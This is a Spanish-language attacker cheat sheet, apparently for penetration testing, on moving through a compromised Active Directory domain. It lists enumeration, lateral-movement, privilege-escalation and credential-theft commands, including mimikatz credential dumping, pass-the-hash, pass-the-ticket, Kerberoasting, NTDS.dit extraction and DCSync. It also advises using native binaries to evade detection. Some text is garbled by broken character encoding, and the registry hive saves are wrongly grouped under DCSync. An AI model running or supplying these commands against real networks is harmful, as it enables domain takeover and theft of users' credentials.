## **1锔 Verificaci贸n de Acceso Inicial**

 _Objetivo:_ Confirmar acceso y obtener informaci贸n b谩sica del usuario comprometido.

```powershell
whoami /all                          # Ver informaci贸n de usuario y grupos
net user <usuario> /domain            # Ver detalles del usuario en el dominio
nltest /dsgetdc:<dominio>             # Obtener controlador de dominio (DC)
systeminfo                            # Ver informaci贸n del sistema
hostname                              # Ver nombre del host
```

---

## **2锔 Enumeraci贸n del Dominio**

 _Objetivo:_ Identificar estructuras clave del AD.

```powershell
net group "Domain Admins" /domain      # Ver qui茅nes son los administradores
net groups /domain                     # Listar todos los grupos
net user /domain                        # Listar todos los usuarios
nltest /domain_trusts                   # Ver confianza entre dominios
Get-ADGroupMember -Identity "Administrators" # Enumerar miembros con PowerView
```

** Living Off The Land:**

```powershell
wmic useraccount get name,sid         # Listar usuarios y sus SIDs
```

---

## **3锔 Enumeraci贸n de M谩quinas y Recursos Compartidos**

 _Objetivo:_ Identificar hosts clave en el dominio.

```powershell
net view /domain:<dominio>             # Listar equipos en el dominio
net share                              # Ver recursos compartidos
arp -a                                 # Ver equipos en la red
Get-NetComputer -Domain <dominio>       # Enumerar equipos con PowerView
nmap -p 139,445 --script smb-enum-shares <IP>  # Buscar recursos compartidos
```

** Living Off The Land:**

```powershell
dir \<IP>\C$                           # Intentar acceso a C$ (requiere permisos)
```

---

## **4锔 Movimiento Lateral**

 _Objetivo:_ Expandir acceso en la red.

###  Con credenciales comprometidas:

```powershell
runas /netonly /user:<dominio\usuario> cmd  # Ejecutar cmd con otro usuario
tscon <ID> /dest:console                     # Tomar sesi贸n RDP activa
psexec \\<IP> -u <dominio\usuario> -p <password> cmd
wmiexec.py <dominio>/<usuario>:<password>@<IP>
# Si tienes NTLM Hash
evil-winrm -i <IP> -u <usuario> -H <NTLM-Hash>
pth-winexe -U <usuario>%<NTLM-Hash> //<IP> cmd.exe
```

** Living Off The Land:**

```powershell
wmic /node:<IP> process call create "cmd.exe /c whoami"
```

---

## **5锔 Privilege Escalation en Windows**

 _Objetivo:_ Elevar privilegios en un host comprometido.

###  Si tienes acceso RDP:

```powershell
whoami /priv                               # Ver privilegios del usuario
icacls C:\ruta\archivo.exe                 # Ver permisos de archivos
# con acceso a RDP
winPEAS.bat          # Escaneo de escalaci贸n en Windows
Seatbelt.exe         # Recolecta informaci贸n para escalaci贸n
# Dumping creds
mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam
```

** Living Off The Land:**

```powershell
findstr /si password *.txt                 # Buscar contrase帽as en archivos
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run  # Buscar persistencia
```

---

## **6锔 Ataques a Active Directory**

 _Objetivo:_ Comprometer el dominio entero.

###  Kerberoasting (Extracci贸n de Tickets de Servicio)

```powershell
setspn -T <dominio> -Q */*                  # Buscar SPNs registrados
GetUserSPNs.py <dominio>/<usuario>:<password> -dc-ip <IP> -request
```

###  Pass-the-Hash (Si tienes NTLM)

```powershell
echo <hash> > hash.txt
mimikatz
sekurlsa::pth /user:<usuario> /domain:<dominio> /ntlm:<hash>
```
###  Pass-the-Ticket (Si tienes un TGT)

```powershell
mimikatz
kerberos::list
kerberos::ptt <ticket.kirbi>
```

`mimikatz kerberos::list kerberos::ptt <ticket.kirbi>`
** Living Off The Land:**

```powershell
rundll32.exe keymgr.dll, KRShowKeyMgr       # Ver credenciales guardadas
```

---

## **7锔 Dominaci贸n Total del AD**

 _Objetivo:_ Obtener control total del dominio.

###  Dumping del NTDS.dit (Base de Datos del AD)

```powershell
vssadmin list shadows                      # Buscar copias de seguridad
secretsdump.py <dominio>/<usuario>@<IP> -just-dc
```

###  DCSync Attack (Si eres Domain Admin)

```powershell
reg save HKLM\System system.hive
reg save HKLM\Security security.hive
mimikatz
lsadump::dcsync /domain:<dominio> /user:<usuario>
```

---

** Notas:**

- Siempre verifica tus permisos antes de ejecutar comandos avanzados.
- Prioriza el uso de binarios nativos para evadir detecci贸n.
- Documenta cada acci贸n para futuras auditor铆as.

---

Este cheat sheet est谩 dise帽ado para ayudarte a moverte dentro de un entorno Active Directory comprometido sin depender de herramientas externas.